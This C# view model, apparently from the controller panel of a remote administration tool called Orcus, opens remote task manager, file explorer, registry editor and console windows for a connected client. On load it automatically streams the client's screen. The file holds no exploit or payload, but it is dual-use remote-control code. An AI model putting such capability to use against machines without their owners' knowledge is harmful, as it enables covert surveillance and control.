﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using SystemInformation.Administration.ViewModels;
using Anapher.Wpf.Swan.ViewInterface;
using Autofac;
using Console.Administration.ViewModels;
using FileExplorer.Administration.ViewModels;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Extensions;
using Orcus.Administration.Library.Models;
using Orcus.Administration.Library.Services;
using Orcus.Administration.Library.ViewModels;
using Prism.Commands;
using Prism.Regions;
using RegistryEditor.Administration.ViewModels;
using RemoteDesktop.Administration.Channels;
using RemoteDesktop.Administration.Rest;
using RemoteDesktop.Shared.Options;
using TaskManager.Administration.ViewModels;
using Unclassified.TxLib;

namespace ClientPanel.Administration.ViewModels
{
    public class ButtonCommandViewModel
    {
        public ButtonCommandViewModel(string header, ICommand command)
        {
            Header = header;
            Command = command;
        }

        public string Header { get; set; }
        public ICommand Command { get; set; }
    }

    public class ClientPanelViewModel : ViewModelBase
    {
        private readonly ClientViewModel _clientViewModel;
        private readonly IOrcusRestClient _orcusRestClient;
        private readonly IPackageRestClient _restClient;
        private readonly IPackageRestClient _remoteDesktopRestClient;
        private readonly IWindow _window;
        private readonly IWindowService _windowService;
        private bool _isToolsOpen;
        private DelegateCommand _openConsoleCommandCommand;
        private DelegateCommand _openFileExplorerCommand;
        private DelegateCommand _openRegistryEditorCommand;
        private DelegateCommand _openSystemInfoCommand;
        private DelegateCommand _openTaskManagerCommand;
        private DelegateCommand _openToolsCommand;
        private string _title;
        private WriteableBitmap _remoteImage;

        public ClientPanelViewModel(ITargetedRestClient restClient, IOrcusRestClient orcusRestClient, ClientViewModel clientViewModel, IWindow window,
            IWindowService windowService)
        {
            _orcusRestClient = orcusRestClient;
            _windowService = windowService;
            _clientViewModel = clientViewModel;
            _window = window;

            _remoteDesktopRestClient = restClient.CreatePackageSpecific("RemoteDesktop");
            _restClient = restClient.CreatePackageSpecific("ClientPanel");

            Title = $"{clientViewModel.Username} - [{clientViewModel.LatestSession.IpAddress}]";
            ComputerPowerCommands = new List<ButtonCommandViewModel>
            {
                new ButtonCommandViewModel(Tx.T("ClientPanel:Power.Sleep"), null),
                new ButtonCommandViewModel(Tx.T("ClientPanel:Power.Shutdown"), null),
                new ButtonCommandViewModel(Tx.T("ClientPanel:Power.Restart"), null)
            };
        }

        public string Title
        {
            get => _title;
            set => SetProperty(ref _title, value);
        }

        public bool IsToolsOpen
        {
            get => _isToolsOpen;
            set => SetProperty(ref _isToolsOpen, value);
        }

        public WriteableBitmap RemoteImage
        {
            get => _remoteImage;
            set => SetProperty(ref _remoteImage, value);
        }

        public List<ButtonCommandViewModel> ComputerPowerCommands { get; }

        public DelegateCommand OpenToolsCommand
        {
            get { return _openToolsCommand ?? (_openToolsCommand = new DelegateCommand(() => IsToolsOpen = !IsToolsOpen)); }
        }

        public DelegateCommand OpenTaskManagerCommand
        {
            get
            {
                return _openTaskManagerCommand ?? (_openTaskManagerCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(TaskManagerViewModel), Tx.T("TaskManager:TaskManager"));
                }));
            }
        }

        public DelegateCommand OpenFileExplorerCommand
        {
            get
            {
                return _openFileExplorerCommand ?? (_openFileExplorerCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(FileExplorerViewModel), Tx.T("FileExplorer:FileExplorer"));
                }));
            }
        }

        public DelegateCommand OpenSystemInfoCommand
        {
            get
            {
                return _openSystemInfoCommand ?? (_openSystemInfoCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(SystemInformationViewModel), Tx.T("SystemInformation:SystemInformation"));
                }));
            }
        }

        public DelegateCommand OpenRegistryEditorCommand
        {
            get
            {
                return _openRegistryEditorCommand ?? (_openRegistryEditorCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(RegistryEditorViewModel), Tx.T("RegistryEditor:Name"));
                }));
            }
        }

        public DelegateCommand OpenConsoleCommandCommand
        {
            get
            {
                return _openConsoleCommandCommand ?? (_openConsoleCommandCommand = new DelegateCommand(() =>
                {
                    OpenCommandWindow(typeof(ConsoleViewModel), Tx.T("Console:Name"));
                }));
            }
        }

        private void OpenCommandWindow(Type viewModelType, string title)
        {
            _windowService.Show(viewModelType, title, _window, null, builder =>
            {
                builder.RegisterInstance(_clientViewModel);
                builder.RegisterInstance(_orcusRestClient.CreateTargeted(_clientViewModel));
            });
        }

        public override async void OnNavigatedTo(NavigationContext navigationContext)
        {
            base.OnNavigatedTo(navigationContext);

            var parameters = await RemoteDesktopResource.GetParameters(_remoteDesktopRestClient);
            var monitor = parameters.Screens.FirstOrDefault(x => x.IsPrimary) ?? parameters.Screens.First();
            
            var remoteDesktop = await RemoteDesktopResource.CreateScreenChannel(
                new DesktopDuplicationOptions { Monitor = { Value = Array.IndexOf(parameters.Screens, monitor) } }, new x264Options(), _remoteDesktopRestClient);
            remoteDesktop.PropertyChanged += RemoteDesktopOnPropertyChanged;
            await remoteDesktop.StartRecording(_remoteDesktopRestClient);
        }

        private void RemoteDesktopOnPropertyChanged(object sender, PropertyChangedEventArgs e)
        {
            var remoteDesktop = (RemoteDesktopChannel)sender;
            switch (e.PropertyName)
            {
                case nameof(RemoteDesktopChannel.Image):
                    RemoteImage = remoteDesktop.Image;
                    break;
            }
        }
    }
}